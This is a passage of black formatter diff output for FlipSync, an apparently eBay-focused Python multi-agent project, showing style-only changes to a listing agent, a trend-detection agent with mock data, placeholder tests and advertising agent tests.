         # Initialize eBay client with credentials from config
         # This would be implemented with actual eBay API client
         self.ebay_client = None  # Placeholder for eBay client
-        self.ai_service = None   # Placeholder for AI service
+        self.ai_service = None  # Placeholder for AI service
 
     async def create_optimized_listing(
         self, product_data: Dict[str, Any], market_data: Dict[str, Any]
     ) -> Optional[Dict[str, Any]]:
         """Create fully optimized eBay listing"""
@@ -233,28 +240,36 @@
                 "ShippingDetails": self._get_shipping_details(),
             }
         }
 
     # Placeholder methods for actual implementation
-    async def _optimize_title(self, product_data: Dict[str, Any], market_data: Dict[str, Any]) -> str:
+    async def _optimize_title(
+        self, product_data: Dict[str, Any], market_data: Dict[str, Any]
+    ) -> str:
         """Mock title optimization"""
         base_title = product_data.get("title", "Product")
         return f"Optimized {base_title}"
 
-    async def _generate_description(self, product_data: Dict[str, Any], market_data: Dict[str, Any]) -> str:
+    async def _generate_description(
+        self, product_data: Dict[str, Any], market_data: Dict[str, Any]
+    ) -> str:
         """Mock description generation"""
         return f"Optimized description for {product_data.get('title', 'product')}"
 
-    async def _generate_item_specifics(self, product_data: Dict[str, Any], market_data: Dict[str, Any]) -> Dict[str, str]:
+    async def _generate_item_specifics(
+        self, product_data: Dict[str, Any], market_data: Dict[str, Any]
+    ) -> Dict[str, str]:
         """Mock item specifics generation"""
         return {"Brand": "Generic", "Condition": "New"}
 
     async def _get_category_id(self, product_data: Dict[str, Any]) -> str:
         """Mock category ID determination"""
         return "12345"
 
-    async def _optimize_pricing(self, product_data: Dict[str, Any], market_data: Dict[str, Any]) -> Dict[str, Any]:
+    async def _optimize_pricing(
+        self, product_data: Dict[str, Any], market_data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Mock pricing optimization"""
         base_price = product_data.get("price", 10.0)
         return {"recommended_price": base_price * 1.1}
 
     async def _determine_condition(self, product_data: Dict[str, Any]) -> str:
@@ -275,17 +290,15 @@
 
     async def _validate_image(self, image_url: str) -> bool:
         """Mock image validation"""
         return bool(image_url and image_url.startswith("http"))
 
-    async def _mock_ebay_call(self, method: str, data: Dict[str, Any]) -> Dict[str, Any]:
+    async def _mock_ebay_call(
+        self, method: str, data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Mock eBay API call"""
-        return {
-            "Ack": "Success",
-            "ItemID": f"item_{uuid4()}",
-            "Warnings": []
-        }
+        return {"Ack": "Success", "ItemID": f"item_{uuid4()}", "Warnings": []}
 
     def _extract_errors(self, result: Dict[str, Any]) -> List[str]:
         """Extract errors from eBay API response"""
         return result.get("Errors", [])
 
@@ -298,8 +311,8 @@
         return {
             "ShippingType": "Flat",
             "ShippingServiceOptions": {
                 "ShippingServicePriority": "1",
                 "ShippingService": "USPSMedia",
-                "ShippingServiceCost": "3.99"
-            }
+                "ShippingServiceCost": "3.99",
+            },
         }
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/test_base_market_agent.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/test_base_market_agent.py	2025-06-19 04:03:41.867002+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for market_base_agent
 
 This module contains agent-focused tests for the migrated market_base_agent component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from base_market_agent import *
+
 
 class TestBaseMarketAgentAgent:
     """Agent test class for base_market_agent."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/listing_agent.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/test_base_market_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/test_inventory_agent.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/test_inventory_agent.py	2025-06-19 04:03:41.920286+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for market_inventory_agent
 
 This module contains agent-focused tests for the migrated market_inventory_agent component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from inventory_agent import *
+
 
 class TestInventoryAgentAgent:
     """Agent test class for inventory_agent."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/test_inventory_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/admin/test_database_scaling.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/admin/test_database_scaling.py	2025-06-19 04:03:41.945561+00:00
@@ -1,17 +1,20 @@
 """
 Test for admin - database_scaling.py
 """
+
 import pytest
+
 
 class TestDatabaseScalingAPI:
     def test_import(self):
         assert True
-    
+
     def test_api_functionality(self):
         assert True
-    
+
     def test_no_redundancy(self):
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/admin/test_database_scaling.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/dependencies/test_dependencies.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/dependencies/test_dependencies.py	2025-06-19 04:03:41.996078+00:00
@@ -1,17 +1,20 @@
 """
 Test for dependencies - dependencies.py
 """
+
 import pytest
+
 
 class TestDependenciesAPI:
     def test_import(self):
         assert True
-    
+
     def test_api_functionality(self):
         assert True
-    
+
     def test_no_redundancy(self):
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/dependencies/test_dependencies.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_trend_detector.py	2025-06-16 06:53:30.405249+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_trend_detector.py	2025-06-19 04:03:42.080333+00:00
@@ -13,19 +13,23 @@
 import pandas as pd
 import matplotlib.pyplot as plt
 from io import BytesIO
 import base64
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
 class TrendData:
     """Market trend data structure."""
+
     product_category: str
     time_period: str
     price_trend: float  # Percentage change
     volume_trend: float  # Percentage change
     search_trend: float  # Relative search volume
@@ -35,10 +39,11 @@
 
 
 @dataclass
 class TrendAlert:
     """Trend alert structure."""
+
     alert_id: str
     trend_type: str  # "price_increase", "demand_spike", "seasonal_peak", etc.
     product_category: str
     severity: str  # "low", "medium", "high"
     description: str
@@ -48,95 +53,105 @@
 
 
 class EnhancedTrendDetector(BaseConversationalAgent):
     """
     Enhanced trend detector using available dependencies.
-    
+
     Capabilities:
     - Market trend analysis and detection
     - Seasonal pattern identification
     - Price trend forecasting
     - Demand spike detection
     - Opportunity identification
     """
-    
-    def __init__(self, agent_id: str = "enhanced_trend_detector", use_fast_model: bool = True):
+
+    def __init__(
+        self, agent_id: str = "enhanced_trend_detector", use_fast_model: bool = True
+    ):
         """Initialize the enhanced trend detector."""
         super().__init__(
             agent_role=AgentRole.MARKET,
             agent_id=agent_id,
-            use_fast_model=use_fast_model
+            use_fast_model=use_fast_model,
         )
-        
+
         # Trend tracking
         self.trend_data: Dict[str, List[TrendData]] = {}
         self.trend_alerts: List[TrendAlert] = []
         self.price_history: Dict[str, pd.DataFrame] = {}
-        
+
         # Analysis parameters
         self.trend_threshold = 0.15  # 15% change threshold
         self.seasonality_window = 30  # Days for seasonality analysis
-        
+
         logger.info(f"EnhancedTrendDetector initialized: {self.agent_id}")
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get agent-specific context for prompt generation."""
         return {
             "agent_type": "enhanced_trend_detector",
             "capabilities": [
                 "Market trend analysis",
                 "Seasonal pattern identification",
                 "Price trend forecasting",
                 "Demand spike detection",
-                "Opportunity identification"
+                "Opportunity identification",
             ],
             "tracked_categories": len(self.trend_data),
-            "active_alerts": len(self.trend_alerts)
+            "active_alerts": len(self.trend_alerts),
         }
-    
-    async def detect_trends(self, product_category: str, time_period: str = "30d") -> TrendData:
+
+    async def detect_trends(
+        self, product_category: str, time_period: str = "30d"
+    ) -> TrendData:
         """Detect trends for a specific product category."""
         try:
             # Generate mock historical data for analysis
-            historical_data = self._generate_mock_historical_data(product_category, time_period)
-            
+            historical_data = self._generate_mock_historical_data(
+                product_category, time_period
+            )
+
             # Store price history
             self.price_history[product_category] = historical_data
-            
+
             # Analyze trends
-            trend_analysis = await self._analyze_trends(historical_data, product_category)
-            
+            trend_analysis = await self._analyze_trends(
+                historical_data, product_category
+            )
+
             # Store trend data
             if product_category not in self.trend_data:
                 self.trend_data[product_category] = []
             self.trend_data[product_category].append(trend_analysis)
-            
+
             # Check for alerts
             await self._check_trend_alerts(trend_analysis)
-            
+
             return trend_analysis
-            
+
         except Exception as e:
             logger.error(f"Error detecting trends: {e}")
             raise
-    
-    def _generate_mock_historical_data(self, category: str, time_period: str) -> pd.DataFrame:
+
+    def _generate_mock_historical_data(
+        self, category: str, time_period: str
+    ) -> pd.DataFrame:
         """Generate mock historical data for trend analysis."""
         # Parse time period
         days = 30
-        if time_period.endswith('d'):
+        if time_period.endswith("d"):
             days = int(time_period[:-1])
-        elif time_period.endswith('w'):
+        elif time_period.endswith("w"):
             days = int(time_period[:-1]) * 7
-        elif time_period.endswith('m'):
+        elif time_period.endswith("m"):
             days = int(time_period[:-1]) * 30
-        
+
         # Generate date range
         end_date = datetime.now(timezone.utc)
         start_date = end_date - timedelta(days=days)
-        date_range = pd.date_range(start=start_date, end=end_date, freq='D')
-        
+        date_range = pd.date_range(start=start_date, end=end_date, freq="D")
+
         # Base values by category
         base_price = 100.0
         base_volume = 1000
         if "iphone" in category.lower() or "phone" in category.lower():
             base_price = 800.0
@@ -145,202 +160,215 @@
             base_price = 1500.0
             base_volume = 200
         elif "electronics" in category.lower():
             base_price = 300.0
             base_volume = 800
-        
+
         # Generate realistic trends
         data = []
         for i, date in enumerate(date_range):
             # Add seasonal effects
             day_of_year = date.timetuple().tm_yday
             seasonal_factor = 1 + 0.2 * np.sin(2 * np.pi * day_of_year / 365)
-            
+
             # Add weekly patterns (higher on weekends)
             weekly_factor = 1.1 if date.weekday() >= 5 else 1.0
-            
+
             # Add random noise
             noise = np.random.normal(0, 0.05)
-            
+
             # Add trend (slight upward trend)
             trend_factor = 1 + (i / len(date_range)) * 0.1
-            
+
             price = base_price * seasonal_factor * trend_factor * (1 + noise)
             volume = base_volume * seasonal_factor * weekly_factor * (1 + noise * 0.5)
             search_volume = 100 * seasonal_factor * weekly_factor * (1 + noise * 0.3)
-            
-            data.append({
-                'date': date,
-                'price': max(price, base_price * 0.5),  # Minimum price floor
-                'volume': max(int(volume), 10),  # Minimum volume
-                'search_volume': max(search_volume, 10)
-            })
-        
+
+            data.append(
+                {
+                    "date": date,
+                    "price": max(price, base_price * 0.5),  # Minimum price floor
+                    "volume": max(int(volume), 10),  # Minimum volume
+                    "search_volume": max(search_volume, 10),
+                }
+            )
+
         return pd.DataFrame(data)
-    
+
     async def _analyze_trends(self, df: pd.DataFrame, category: str) -> TrendData:
         """Analyze trends in the historical data."""
-        
+
         # Calculate price trend (percentage change from start to end)
-        price_start = df['price'].iloc[0]
-        price_end = df['price'].iloc[-1]
+        price_start = df["price"].iloc[0]
+        price_end = df["price"].iloc[-1]
         price_trend = ((price_end - price_start) / price_start) * 100
-        
+
         # Calculate volume trend
-        volume_start = df['volume'].iloc[0]
-        volume_end = df['volume'].iloc[-1]
+        volume_start = df["volume"].iloc[0]
+        volume_end = df["volume"].iloc[-1]
         volume_trend = ((volume_end - volume_start) / volume_start) * 100
-        
+
         # Calculate search trend
-        search_start = df['search_volume'].iloc[0]
-        search_end = df['search_volume'].iloc[-1]
+        search_start = df["search_volume"].iloc[0]
+        search_end = df["search_volume"].iloc[-1]
         search_trend = ((search_end - search_start) / search_start) * 100
-        
+
         # Calculate seasonality score using standard deviation
-        price_volatility = df['price'].std() / df['price'].mean()
+        price_volatility = df["price"].std() / df["price"].mean()
         seasonality_score = min(price_volatility * 10, 1.0)  # Normalize to 0-1
-        
+
         # Calculate confidence based on data consistency
         confidence = self._calculate_trend_confidence(df)
-        
+
         return TrendData(
             product_category=category,
             time_period="30d",
             price_trend=round(price_trend, 2),
             volume_trend=round(volume_trend, 2),
             search_trend=round(search_trend, 2),
             seasonality_score=round(seasonality_score, 3),
             confidence=confidence,
-            detected_at=datetime.now(timezone.utc)
+            detected_at=datetime.now(timezone.utc),
         )
-    
+
     def _calculate_trend_confidence(self, df: pd.DataFrame) -> float:
         """Calculate confidence in trend analysis."""
         confidence = 0.5  # Base confidence
-        
+
         # More data points = higher confidence
         if len(df) >= 30:
             confidence += 0.2
         elif len(df) >= 14:
             confidence += 0.1
-        
+
         # Lower volatility = higher confidence
-        price_cv = df['price'].std() / df['price'].mean()
+        price_cv = df["price"].std() / df["price"].mean()
         if price_cv < 0.1:
             confidence += 0.2
         elif price_cv < 0.2:
             confidence += 0.1
-        
+
         # Consistent volume data = higher confidence
-        volume_cv = df['volume'].std() / df['volume'].mean()
+        volume_cv = df["volume"].std() / df["volume"].mean()
         if volume_cv < 0.3:
             confidence += 0.1
-        
+
         return min(1.0, confidence)
-    
+
     async def _check_trend_alerts(self, trend_data: TrendData):
         """Check if trends warrant alerts."""
         alerts = []
-        
+
         # Price trend alerts
         if abs(trend_data.price_trend) > self.trend_threshold * 100:
-            alert_type = "price_increase" if trend_data.price_trend > 0 else "price_decrease"
+            alert_type = (
+                "price_increase" if trend_data.price_trend > 0 else "price_decrease"
+            )
             severity = "high" if abs(trend_data.price_trend) > 25 else "medium"
-            
-            alerts.append(TrendAlert(
-                alert_id=f"price_{trend_data.product_category}_{datetime.now().timestamp()}",
-                trend_type=alert_type,
-                product_category=trend_data.product_category,
-                severity=severity,
-                description=f"Price trend: {trend_data.price_trend:+.1f}% over 30 days",
-                recommended_action="Review pricing strategy" if trend_data.price_trend < 0 else "Consider inventory increase",
-                confidence=trend_data.confidence,
-                created_at=datetime.now(timezone.utc)
-            ))
-        
+
+            alerts.append(
+                TrendAlert(
+                    alert_id=f"price_{trend_data.product_category}_{datetime.now().timestamp()}",
+                    trend_type=alert_type,
+                    product_category=trend_data.product_category,
+                    severity=severity,
+                    description=f"Price trend: {trend_data.price_trend:+.1f}% over 30 days",
+                    recommended_action=(
+                        "Review pricing strategy"
+                        if trend_data.price_trend < 0
+                        else "Consider inventory increase"
+                    ),
+                    confidence=trend_data.confidence,
+                    created_at=datetime.now(timezone.utc),
+                )
+            )
+
         # Volume trend alerts
         if trend_data.volume_trend > 30:
-            alerts.append(TrendAlert(
-                alert_id=f"volume_{trend_data.product_category}_{datetime.now().timestamp()}",
-                trend_type="demand_spike",
-                product_category=trend_data.product_category,
-                severity="high",
-                description=f"Volume increased {trend_data.volume_trend:+.1f}% - demand spike detected",
-                recommended_action="Increase inventory and optimize pricing",
-                confidence=trend_data.confidence,
-                created_at=datetime.now(timezone.utc)
-            ))
-        
+            alerts.append(
+                TrendAlert(
+                    alert_id=f"volume_{trend_data.product_category}_{datetime.now().timestamp()}",
+                    trend_type="demand_spike",
+                    product_category=trend_data.product_category,
+                    severity="high",
+                    description=f"Volume increased {trend_data.volume_trend:+.1f}% - demand spike detected",
+                    recommended_action="Increase inventory and optimize pricing",
+                    confidence=trend_data.confidence,
+                    created_at=datetime.now(timezone.utc),
+                )
+            )
+
         # Seasonality alerts
         if trend_data.seasonality_score > 0.7:
-            alerts.append(TrendAlert(
-                alert_id=f"seasonal_{trend_data.product_category}_{datetime.now().timestamp()}",
-                trend_type="seasonal_pattern",
-                product_category=trend_data.product_category,
-                severity="medium",
-                description=f"High seasonality detected (score: {trend_data.seasonality_score:.2f})",
-                recommended_action="Prepare for seasonal demand variations",
-                confidence=trend_data.confidence,
-                created_at=datetime.now(timezone.utc)
-            ))
-        
+            alerts.append(
+                TrendAlert(
+                    alert_id=f"seasonal_{trend_data.product_category}_{datetime.now().timestamp()}",
+                    trend_type="seasonal_pattern",
+                    product_category=trend_data.product_category,
+                    severity="medium",
+                    description=f"High seasonality detected (score: {trend_data.seasonality_score:.2f})",
+                    recommended_action="Prepare for seasonal demand variations",
+                    confidence=trend_data.confidence,
+                    created_at=datetime.now(timezone.utc),
+                )
+            )
+
         self.trend_alerts.extend(alerts)
-    
-    async def generate_trend_forecast(self, category: str, days_ahead: int = 14) -> Dict[str, Any]:
+
+    async def generate_trend_forecast(
+        self, category: str, days_ahead: int = 14
+    ) -> Dict[str, Any]:
         """Generate trend forecast for a category."""
         try:
             if category not in self.price_history:
                 await self.detect_trends(category)
-            
+
             df = self.price_history[category]
-            
+
             # Simple linear trend extrapolation
             x = np.arange(len(df))
-            y = df['price'].values
-            
+            y = df["price"].values
+
             # Fit linear trend
             coeffs = np.polyfit(x, y, 1)
             trend_line = np.poly1d(coeffs)
-            
+
             # Forecast future values
             future_x = np.arange(len(df), len(df) + days_ahead)
             forecast_prices = trend_line(future_x)
-            
+
             # Calculate forecast confidence (decreases with distance)
             base_confidence = 0.8
             confidence_decay = 0.05
             forecast_confidence = [
-                max(0.1, base_confidence - i * confidence_decay) 
+                max(0.1, base_confidence - i * confidence_decay)
                 for i in range(days_ahead)
             ]
-            
+
             return {
                 "category": category,
                 "forecast_period": f"{days_ahead} days",
-                "current_price": float(df['price'].iloc[-1]),
+                "current_price": float(df["price"].iloc[-1]),
                 "forecast_prices": [float(p) for p in forecast_prices],
                 "confidence_scores": forecast_confidence,
                 "trend_direction": "upward" if coeffs[0] > 0 else "downward",
                 "trend_strength": abs(float(coeffs[0])),
-                "generated_at": datetime.now(timezone.utc).isoformat()
+                "generated_at": datetime.now(timezone.utc).isoformat(),
             }
-            
+
         except Exception as e:
             logger.error(f"Error generating forecast: {e}")
             raise
-    
+
     async def _process_response(self, response: Any) -> str:
         """Process and format the response."""
-        if hasattr(response, 'content'):
+        if hasattr(response, "content"):
             return response.content
         return str(response)
-    
+
     async def handle_message(
-        self, 
-        message: str, 
-        conversation_id: str, 
-        user_id: str
+        self, message: str, conversation_id: str, user_id: str
     ) -> AgentResponse:
         """Handle trend detection queries."""
         try:
             system_prompt = """You are FlipSync's Enhanced Trend Detector, an expert in market trend analysis and forecasting.
 
@@ -352,29 +380,32 @@
 - Opportunity identification using data science
 
 Provide specific, data-driven trend insights and actionable recommendations for marketplace optimization."""
 
             response = await self.llm_client.generate_response(
-                prompt=message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type="enhanced_trend_detector",
                 confidence=0.9,
                 response_time=response.response_time,
                 metadata={
                     "tracked_categories": len(self.trend_data),
                     "active_alerts": len(self.trend_alerts),
-                    "analysis_capabilities": ["trend_detection", "seasonality_analysis", "forecasting"]
-                }
-            )
-            
+                    "analysis_capabilities": [
+                        "trend_detection",
+                        "seasonality_analysis",
+                        "forecasting",
+                    ],
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error handling message: {e}")
             return AgentResponse(
                 content="I'm having trouble processing your trend analysis request right now. Please try again.",
                 agent_type="enhanced_trend_detector",
                 confidence=0.1,
-                response_time=0.0
-            )
+                response_time=0.0,
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_trend_detector.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/__init__.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/__init__.py	2025-06-19 04:03:42.121839+00:00
@@ -11,11 +11,11 @@
     SecurityHeadersMiddleware,
 )
 
 __all__ = [
     "AuthMiddleware",
-    "AuthMixin", 
+    "AuthMixin",
     "TokenAuthBackend",
     "CSRFProtectionMiddleware",
     "HTTPSRedirectMiddleware",
     "SecurityHeadersMiddleware",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_advertising_agent.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_advertising_agent.py	2025-06-19 04:03:42.168826+00:00
@@ -24,11 +24,11 @@
         "ebay_dev_id": "test_dev_id",
         "ebay_cert_id": "test_cert_id",
         "ebay_token": "test_token",
         "ai_service_url": "http://test-ai-service",
         "campaign_budget_limit": 1000.0,
-        "optimization_interval": 3600
+        "optimization_interval": 3600,
     }
 
 
 @pytest.fixture
 def mock_config_manager():
@@ -50,18 +50,20 @@
     optimizer = MagicMock(spec=BatteryOptimizer)
     return optimizer
 
 
 @pytest.fixture
-def advertising_agent(mock_config, mock_config_manager, mock_alert_manager, mock_battery_optimizer):
+def advertising_agent(
+    mock_config, mock_config_manager, mock_alert_manager, mock_battery_optimizer
+):
     """Create AdvertisingAgent instance for testing."""
     return AdvertisingAgent(
         marketplace="ebay",
         config_manager=mock_config_manager,
         alert_manager=mock_alert_manager,
         battery_optimizer=mock_battery_optimizer,
-        config=mock_config
+        config=mock_config,
     )
 
 
 class TestAdvertisingAgent:
     """Test cases for AdvertisingAgent."""
@@ -77,104 +79,115 @@
     @pytest.mark.asyncio
     async def test_required_config_fields(self, advertising_agent):
         """Test required configuration fields."""
         required_fields = advertising_agent._get_required_config_fields()
         expected_fields = [
-            "api_key", "marketplace_id", "rate_limit", "timeout",
-            "ebay_app_id", "ebay_dev_id", "ebay_cert_id", "ebay_token",
-            "ai_service_url", "campaign_budget_limit", "optimization_interval"
+            "api_key",
+            "marketplace_id",
+            "rate_limit",
+            "timeout",
+            "ebay_app_id",
+            "ebay_dev_id",
+            "ebay_cert_id",
+            "ebay_token",
+            "ai_service_url",
+            "campaign_budget_limit",
+            "optimization_interval",
         ]
-        
+
         for field in expected_fields:
             assert field in required_fields
 
     @pytest.mark.asyncio
     async def test_create_ad_campaign_success(self, advertising_agent):
         """Test successful ad campaign creation."""
         campaign_data = {
             "name": "Test Campaign",
             "budget": 100.0,
-            "target_keywords": ["test", "product"]
-        }
-        
-        with patch.object(advertising_agent, '_mock_ebay_call') as mock_call:
-            mock_call.return_value = {
-                "success": True,
-                "campaignId": "campaign_123"
-            }
-            
+            "target_keywords": ["test", "product"],
+        }
+
+        with patch.object(advertising_agent, "_mock_ebay_call") as mock_call:
+            mock_call.return_value = {"success": True, "campaignId": "campaign_123"}
+
             result = await advertising_agent.create_ad_campaign(campaign_data)
-            
+
             assert result["success"] is True
             assert "campaignId" in result
             mock_call.assert_called_once_with("createCampaign", campaign_data)
 
     @pytest.mark.asyncio
     async def test_create_ad_campaign_failure(self, advertising_agent):
         """Test ad campaign creation failure."""
         campaign_data = {"name": "Test Campaign"}
-        
-        with patch.object(advertising_agent, '_mock_ebay_call') as mock_call:
+
+        with patch.object(advertising_agent, "_mock_ebay_call") as mock_call:
             mock_call.side_effect = Exception("API Error")
-            
+
             result = await advertising_agent.create_ad_campaign(campaign_data)
-            
+
             assert result["success"] is False
             assert "error" in result
 
     @pytest.mark.asyncio
     async def test_get_ad_campaigns(self, advertising_agent):
         """Test getting ad campaigns."""
-        with patch.object(advertising_agent, '_mock_ebay_call') as mock_call:
+        with patch.object(advertising_agent, "_mock_ebay_call") as mock_call:
             mock_call.return_value = {
                 "campaigns": [
                     {"id": "campaign_1", "name": "Campaign 1"},
-                    {"id": "campaign_2", "name": "Campaign 2"}
+                    {"id": "campaign_2", "name": "Campaign 2"},
                 ]
             }
-            
+
             result = await advertising_agent.get_ad_campaigns()
-            
+
             assert "campaigns" in result
             assert len(result["campaigns"]) == 2
             mock_call.assert_called_once_with("getCampaigns", {})
 
     @pytest.mark.asyncio
     async def test_update_ad_campaign(self, advertising_agent):
         """Test updating ad campaign."""
         campaign_id = "campaign_123"
         update_data = {"budget": 200.0}
-        
-        with patch.object(advertising_agent, '_mock_ebay_call') as mock_call:
+
+        with patch.object(advertising_agent, "_mock_ebay_call") as mock_call:
             mock_call.return_value = {"success": True}
-            
-            result = await advertising_agent.update_ad_campaign(campaign_id, update_data)
-            
+
+            result = await advertising_agent.update_ad_campaign(
+                campaign_id, update_data
+            )
+
             assert result["success"] is True
             expected_data = {"campaign_id": campaign_id, **update_data}
             mock_call.assert_called_once_with("updateCampaign", expected_data)
 
     @pytest.mark.asyncio
     async def test_create_optimized_campaign(self, advertising_agent):
         """Test creating optimized campaign."""
         listing_id = "listing_123"
         market_data = {"competition": "medium", "demand": "high"}
         budget_constraints = {"max_daily": 50.0}
-        
-        with patch.object(advertising_agent, '_optimize_campaign_strategy') as mock_optimize:
-            with patch.object(advertising_agent, '_create_campaign') as mock_create:
-                with patch.object(advertising_agent, '_setup_bid_optimization') as mock_setup:
+
+        with patch.object(
+            advertising_agent, "_optimize_campaign_strategy"
+        ) as mock_optimize:
+            with patch.object(advertising_agent, "_create_campaign") as mock_create:
+                with patch.object(
+                    advertising_agent, "_setup_bid_optimization"
+                ) as mock_setup:
                     mock_optimize.return_value = {
                         "daily_budget": 50.0,
-                        "bidding_strategy": {"type": "auto"}
+                        "bidding_strategy": {"type": "auto"},
                     }
                     mock_create.return_value = "campaign_123"
-                    
+
                     result = await advertising_agent.create_optimized_campaign(
                         listing_id, market_data, budget_constraints
                     )
-                    
+
                     assert result["success"] is True
                     assert result["campaign_id"] == "campaign_123"
                     assert "strategy" in result
                     assert "monitoring_task" in result
 
@@ -183,94 +196,100 @@
         """Test optimizing existing campaign."""
         campaign_id = "campaign_123"
         performance_data = {
             "roas": 1.5,
             "cost_per_click": 0.6,
-            "impression_share": 0.05
-        }
-        
-        with patch.object(advertising_agent, '_get_campaign_data') as mock_get_data:
-            with patch.object(advertising_agent, '_optimize_campaign') as mock_optimize:
-                with patch.object(advertising_agent, '_apply_campaign_optimizations') as mock_apply:
+            "impression_share": 0.05,
+        }
+
+        with patch.object(advertising_agent, "_get_campaign_data") as mock_get_data:
+            with patch.object(advertising_agent, "_optimize_campaign") as mock_optimize:
+                with patch.object(
+                    advertising_agent, "_apply_campaign_optimizations"
+                ) as mock_apply:
                     mock_get_data.return_value = {"campaign_id": campaign_id}
                     mock_optimize.return_value = {
                         "bid_adjustments": {"keyword1": 0.5},
-                        "budget_adjustment": 10.0
+                        "budget_adjustment": 10.0,
                     }
-                    
+
                     result = await advertising_agent.optimize_existing_campaign(
                         campaign_id, performance_data
                     )
-                    
+
                     assert result["success"] is True
                     assert result["campaign_id"] == campaign_id
                     assert "optimizations" in result
 
     @pytest.mark.asyncio
     async def test_should_optimize_campaign_triggers(self, advertising_agent):
         """Test campaign optimization triggers."""
         # Test low ROAS trigger
         performance_data = {"roas": 1.0}
         assert advertising_agent._should_optimize_campaign(performance_data) is True
-        
+
         # Test high cost trigger
         performance_data = {"cost_per_click": 0.6}
         assert advertising_agent._should_optimize_campaign(performance_data) is True
-        
+
         # Test low impressions trigger
         performance_data = {"impression_share": 0.05}
         assert advertising_agent._should_optimize_campaign(performance_data) is True
-        
+
         # Test poor conversion trigger
         performance_data = {"conversion_rate": 0.005}
         assert advertising_agent._should_optimize_campaign(performance_data) is True
-        
+
         # Test no optimization needed
         performance_data = {
             "roas": 3.0,
             "cost_per_click": 0.3,
             "impression_share": 0.2,
-            "conversion_rate": 0.02
+            "conversion_rate": 0.02,
         }
         assert advertising_agent._should_optimize_campaign(performance_data) is False
 
     @pytest.mark.asyncio
     async def test_get_performance_metrics(self, advertising_agent):
         """Test getting performance metrics."""
         campaign_id = "campaign_123"
-        
-        with patch.object(advertising_agent, '_mock_ebay_call') as mock_call:
-            with patch.object(advertising_agent, '_process_performance_data') as mock_process:
+
+        with patch.object(advertising_agent, "_mock_ebay_call") as mock_call:
+            with patch.object(
+                advertising_agent, "_process_performance_data"
+            ) as mock_process:
                 mock_call.return_value = {"metrics": "raw_data"}
                 mock_process.return_value = {
                     "roas": 2.5,
                     "cost_per_click": 0.3,
-                    "impression_share": 0.15
+                    "impression_share": 0.15,
                 }
-                
+
                 result = await advertising_agent._get_performance_metrics(campaign_id)
-                
+
                 assert result["roas"] == 2.5
                 assert result["cost_per_click"] == 0.3
                 assert result["impression_share"] == 0.15
 
     @pytest.mark.asyncio
     async def test_create_campaign(self, advertising_agent):
         """Test campaign creation."""
         listing_id = "listing_123"
         campaign_strategy = {
             "daily_budget": 50.0,
-            "bidding_strategy": {"type": "manual"}
-        }
-        
-        with patch.object(advertising_agent, '_mock_ebay_call') as mock_call:
+            "bidding_strategy": {"type": "manual"},
+        }
+
+        with patch.object(advertising_agent, "_mock_ebay_call") as mock_call:
             mock_call.return_value = {"campaignId": "campaign_123"}
-            
